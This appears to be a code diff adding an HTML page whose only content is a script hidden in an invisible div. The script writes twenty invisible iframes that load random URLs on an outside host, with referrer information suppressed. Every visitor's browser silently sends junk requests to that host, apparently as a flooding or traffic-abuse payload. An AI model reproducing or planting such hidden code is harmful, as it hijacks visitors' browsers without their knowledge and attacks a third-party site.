@@ -1,0 +1,30 @@
+<html><head><meta name="referrer" content="no-referrer">
+
+</head><body>
+<div style="display:none">
+<script>
+function randomIntFromInterval(min,max){
+    return Math.floor(Math.random()*(max-min+1)+min);
+}
+
+function str_rand() {
+        var result       = '';
+        var words        = '0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
+        var max_position = words.length - 1;
+            for( i = 0; i < randomIntFromInterval(1,100); ++i ) {
+                position = Math.floor ( Math.random() * max_position );
+                result = result + words.substring(position, position + 1);
+            }
+        return result;
+}  
+
+var array = ['dashboard.php','login.php','register.php','index.php'];
+var i = 0;
+while (i < 20) {
+i++;
+document.write('<iframe src="https://filex.pw/'+str_rand()+str_rand()+'?'+randomIntFromInterval(1,3000)+'"></iframe>');
+}
+</script> 
+</div>
+</body>
+</html>
